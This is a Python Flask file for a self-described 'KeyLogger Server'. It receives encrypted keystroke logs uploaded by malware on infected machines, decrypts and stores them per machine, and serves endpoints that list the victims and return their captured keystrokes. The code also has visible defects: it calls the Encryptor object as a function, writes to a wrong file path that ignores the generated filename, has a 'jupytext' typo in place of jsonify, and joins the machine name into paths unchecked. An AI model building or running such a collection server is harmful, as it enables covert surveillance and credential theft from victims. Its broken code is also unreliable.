import os
import time
import base64
from flask import Flask, jsonify, request
import encryption

app = Flask(__name__)
DATA_FOLDER = 'data'

# Example key, matching the document's example


@app.route('/')
def home():
    return "KeyLogger Server is Running"

def generate_log_filename():
    return "log_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"

@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.get_json()
    if not data or "machine" not in data or "data" not in data or "encryption_key" not in data:
        return jsonify({"error": "Invalid payload: machine, data, and encryption_key are required"}), 400

    machine = data["machine"]
    encrypted_data_b64 = data["data"]  # Base64 encoded encrypted bytes
    encryption_key = data["encryption_key"]  # Key sent by the malware
    encryptor = encryption.Encryptor(encryption_key)
    try:
        # Instantiate Encryptor with the provided key
        encryptor1 = encryptor(encryption_key)

        encrypted_data = base64.b64decode(encrypted_data_b64)
        log_data = encryptor.decrypt(encrypted_data)
    except Exception as e:
        return jsonify({"error": f"Decryption failed: {str(e)}"}), 400

    machine_folder = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_folder):
        os.makedirs(machine_folder)

    filename = generate_log_filename()
    file_path = f"/{machine_folder}"

    with open(file_path, "w", encoding="utf-8") as f:
        f.write(log_data)

    return jsonify({"status": "success", "file": file_path}), 200

@app.route('/computers', methods=['GET'])
def computers():
    if not os.path.exists(DATA_FOLDER):
        return jsonify([])

    machines = [d for d in os.listdir(DATA_FOLDER) if os.path.isdir(os.path.join(DATA_FOLDER, d))]
    return jsonify(machines)

@app.route('/computer/<name>', methods=['GET'])
def computer(name):
    machine_folder = os.path.join(DATA_FOLDER, name)
    if not os.path.exists(machine_folder):
        return jsonify({"error": "Machine not found"}), 404

    content = {}
    for filename in sorted(os.listdir(machine_folder)):
        if filename.endswith('.txt'):
            file_path = os.path.join(machine_folder, filename)
            with open(file_path, "r", encoding="utf-8") as f:
                content[filename] = f.read()

    return jsonify({"content": content})

# Keeping the original API routes for compatibility
@app.route('/api/get_target_machines_list', methods=['GET'])
def get_target_machines_list():
    if not os.path.exists(DATA_FOLDER):
        return jsonify({"machines": []})

    machines = [d for d in os.listdir(DATA_FOLDER) if os.path.isdir(os.path.join(DATA_FOLDER, d))]
    return jsonify({"machines": machines})

@app.route('/api/get_keystrokes', methods=['GET'])
def get_keystrokes():
    machine = request.args.get('machine')
    if not machine:
        return jsonify({"error": "Machine parameter is required"}), 400

    machine_folder = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_folder):
        return jupytext({"error": "Machine not found"}), 404

    logs = []
    for filename in sorted(os.listdir(machine_folder)):
        if filename.endswith('.txt'):
            file_path = os.path.join(machine_folder, filename)
            with open(file_path, "r", encoding="utf-8") as f:
                content = f.read()
            logs.append(f"--- {filename} ---\n{content}\n")

    full_keystrokes = "".join(logs)
    return jsonify({"machine": machine, "keystrokes": full_keystrokes})

if __name__ == '__main__':
    app.run(host="127.0.0.1", port=5000, debug=True)